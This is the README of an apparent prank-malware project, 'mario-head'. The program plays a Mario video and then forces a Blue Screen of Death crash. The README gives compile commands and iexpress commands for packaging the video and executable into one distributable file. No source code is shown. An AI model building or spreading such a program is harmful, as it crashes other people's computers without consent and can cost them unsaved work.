# mario-head

Original repo:https://github.com/bemxio/mario-head

A little malware script to display a video of Mario's levitating head, asking if he can have your computer, and crashing your PC with a Blue Screen of Death.

Mostly made with DirectShow and some other libraries.

## Compiling

### With `cl`
Make sure to run it from the "x86/x64 Native Tools Command Prompt", so that you can use `cl`.

You probably should just use the provided `compile.bat` Batch script, but you can also do it manually, by simply doing:
```sh
cl main.cpp /Fe:"mario.exe"
```

The script already has pragmas with needed libraries set up, so in case of `cl`, you don't need to add anything else to the command line arguments.

### With `g++`
I am not sure if there's a way to do it with `g++`. It's better to just download VS Build Tools & roll in with that.

## Distributing
You can pack the video file and the main script together using `iexpress`, with the provided SED file, containing all of the settings:
```sh
iexpress /Q /N iexpress.sed
```

or, if you have a 64-bit system and want to package it into a 32-bit executable:
```sh
%SYSTEMROOT%\SysWOW64\iexpress.exe /Q /N iexpress.sed
```

## The video
The original video comes from [Mario Teaches Typing 2](https://www.mariowiki.com/Mario_Teaches_Typing_2), the exact source is from ["Mario Head Collection"](https://www.youtube.com/watch?v=9tQWLg4E90M&t=30s) on Youtube.

If you want to replace the video, feel free to swap out `mario.wmv` with an another video.
You will need to convert the video into a `.wmv` format, either by using `ffmpeg` or some obscure online converter. Just make sure to keep the same filename, or else, the script will immediately cause a BSoD.

